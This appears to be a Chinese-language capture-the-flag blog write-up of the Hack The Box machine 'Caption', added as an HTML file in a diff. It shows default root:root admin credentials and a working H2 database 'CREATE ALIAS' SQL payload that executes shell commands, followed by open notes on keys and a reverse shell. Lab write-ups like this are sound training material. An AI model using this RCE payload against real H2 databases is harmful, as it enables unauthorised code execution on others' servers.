@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="root:root  http:&#x2F;&#x2F;10.10.11.33:8080&#x2F;admin&#x2F;dbviewer 考虑到 GitBucket 是一个 java Web 应用程序，从 cookie 中：JSESSIONID，我们想到了 H2，它是一个用 Java 编写的关系数据库管理系统（我们可以通过运行不正确的查询来确认这一点），我们使用查找版本，它是 1.4.199。在谷歌上搜索，我们发现了这篇关于链接 R">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB caption">
+<meta property="og:url" content="https://imli.ink/2024/11/13/2024-09-21-caption/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="root:root  http:&#x2F;&#x2F;10.10.11.33:8080&#x2F;admin&#x2F;dbviewer 考虑到 GitBucket 是一个 java Web 应用程序，从 cookie 中：JSESSIONID，我们想到了 H2，它是一个用 Java 编写的关系数据库管理系统（我们可以通过运行不正确的查询来确认这一点），我们使用查找版本，它是 1.4.199。在谷歌上搜索，我们发现了这篇关于链接 R">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://imli.ink/assets/img/%7BB831FCD2-CB24-47A2-A74B-BEE516299CDC%7D.png">
+<meta property="og:image" content="https://imli.ink/assets/img/%7BCB7890AC-9968-4B06-BC49-085D9DC6C814%7D.png">
+<meta property="og:image" content="https://imli.ink/assets/img/%7B9BF84C05-6926-491B-9D46-F08668B09AD7%7D.png">
+<meta property="og:image" content="https://imli.ink/assets/img/%7BFB6DC057-1964-4F82-B362-CE0D31E22E67%7D.png">
+<meta property="og:image" content="https://imli.ink/assets/img/%7BC79FD5D5-5C46-4C55-B26D-DE8C62B932BC%7D.png">
+<meta property="og:image" content="https://imli.ink/assets/img/%7BB77018B7-C1FA-4031-8F76-6136A6BE1F45%7D.png">
+<meta property="og:image" content="https://imli.ink/assets/img/%7B789671E9-4632-4454-A382-D41C38D76855%7D.png">
+<meta property="article:published_time" content="2024-11-13T11:03:45.127Z">
+<meta property="article:modified_time" content="2024-09-21T11:36:05.077Z">
+<meta property="article:author" content="Leon">
+<meta property="article:tag" content="网络安全">
+<meta property="article:tag" content="HTB">
+<meta property="article:tag" content="GIT">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://imli.ink/assets/img/%7BB831FCD2-CB24-47A2-A74B-BEE516299CDC%7D.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HTB caption</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-86660611-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-86660611-1');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/leonooo13">项目</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2024/11/13/2024-09-27-jb-crack-tools/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2024/11/13/2024-09-19-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://imli.ink/2024/11/13/2024-09-21-caption/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://imli.ink/2024/11/13/2024-09-21-caption/&text=HTB caption"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://imli.ink/2024/11/13/2024-09-21-caption/&title=HTB caption"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://imli.ink/2024/11/13/2024-09-21-caption/&is_video=false&description=HTB caption"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB caption&body=Check out this article: https://imli.ink/2024/11/13/2024-09-21-caption/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://imli.ink/2024/11/13/2024-09-21-caption/&title=HTB caption"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://imli.ink/2024/11/13/2024-09-21-caption/&title=HTB caption"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://imli.ink/2024/11/13/2024-09-21-caption/&title=HTB caption"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://imli.ink/2024/11/13/2024-09-21-caption/&title=HTB caption"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://imli.ink/2024/11/13/2024-09-21-caption/&name=HTB caption&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://imli.ink/2024/11/13/2024-09-21-caption/&t=HTB caption"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HTB caption
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Leon</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-11-13T11:03:45.127Z" class="dt-published" itemprop="datePublished">2024-11-13</time>
+        
+        (Updated: <time datetime="2024-09-21T11:36:05.077Z" class="dt-updated" itemprop="dateModified">2024-09-21</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/HTB/">HTB</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/GIT/" rel="tag">GIT</a>, <a class="p-category" href="/tags/HTB/" rel="tag">HTB</a>, <a class="p-category" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <ol>
+<li>root:root<br><img src="/../assets/img/%7BB831FCD2-CB24-47A2-A74B-BEE516299CDC%7D.png" alt="alt text"></li>
+</ol>
+<p><a target="_blank" rel="noopener" href="http://10.10.11.33:8080/admin/dbviewer">http://10.10.11.33:8080/admin/dbviewer</a></p>
+<p>考虑到 GitBucket 是一个 java Web 应用程序，从 cookie 中：JSESSIONID，我们想到了 H2，它是一个用 Java 编写的关系数据库管理系统（我们可以通过运行不正确的查询来确认这一点），我们使用查找版本，它是 1.4.199。在谷歌上搜索，我们发现了这篇关于链接 RCE 的 H2 数据库中的漏洞的 Medium 帖子。SELECT H2VERSION() FROM DUALH2 java 1.4.199 exploit</p>
+<p>所以基本上，H2 容易受到 RCE 的攻击，我们可以执行任意命令。我们首先创建一个名为 REVEXEC 的别名，这将允许我们稍后运行 shell 命令和执行代码。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ALIAS REVEXEC <span class="keyword">AS</span> $$ String shellexec(String cmd) throws java.io.IOException &#123;</span><br><span class="line">    java.util.Scanner s <span class="operator">=</span> <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().<span class="keyword">exec</span>(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;);</span><br><span class="line">    <span class="keyword">return</span> s.hasNext() ? s.next() : &quot;&quot;; </span><br><span class="line">&#125;$$;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../assets/img/%7BCB7890AC-9968-4B06-BC49-085D9DC6C814%7D.png" alt="alt text"></p>
+<p>执行后，我们现在可以调用我们的别名来执行命令。</p>
+<p><img src="/../assets/img/%7B9BF84C05-6926-491B-9D46-F08668B09AD7%7D.png" alt="alt text"></p>
+<p><img src="/../assets/img/%7BFB6DC057-1964-4F82-B362-CE0D31E22E67%7D.png" alt="alt text"></p>
+<p>公钥私钥？<br>利用私钥登录？<br><img src="/../assets/img/%7BC79FD5D5-5C46-4C55-B26D-DE8C62B932BC%7D.png" alt="alt text"></p>
+<p><img src="/../assets/img/%7BB77018B7-C1FA-4031-8F76-6136A6BE1F45%7D.png" alt="alt text"><br><img src="/../assets/img/%7B789671E9-4632-4454-A382-D41C38D76855%7D.png" alt="alt text"></p>
+<p>为啥？<br>反弹shell？</p>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/leonooo13">项目</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://imli.ink/2024/11/13/2024-09-21-caption/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://imli.ink/2024/11/13/2024-09-21-caption/&text=HTB caption"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://imli.ink/2024/11/13/2024-09-21-caption/&title=HTB caption"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://imli.ink/2024/11/13/2024-09-21-caption/&is_video=false&description=HTB caption"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB caption&body=Check out this article: https://imli.ink/2024/11/13/2024-09-21-caption/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://imli.ink/2024/11/13/2024-09-21-caption/&title=HTB caption"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://imli.ink/2024/11/13/2024-09-21-caption/&title=HTB caption"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://imli.ink/2024/11/13/2024-09-21-caption/&title=HTB caption"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://imli.ink/2024/11/13/2024-09-21-caption/&title=HTB caption"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://imli.ink/2024/11/13/2024-09-21-caption/&name=HTB caption&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://imli.ink/2024/11/13/2024-09-21-caption/&t=HTB caption"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    Leon
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/leonooo13">项目</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'leonooo13/Talk';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
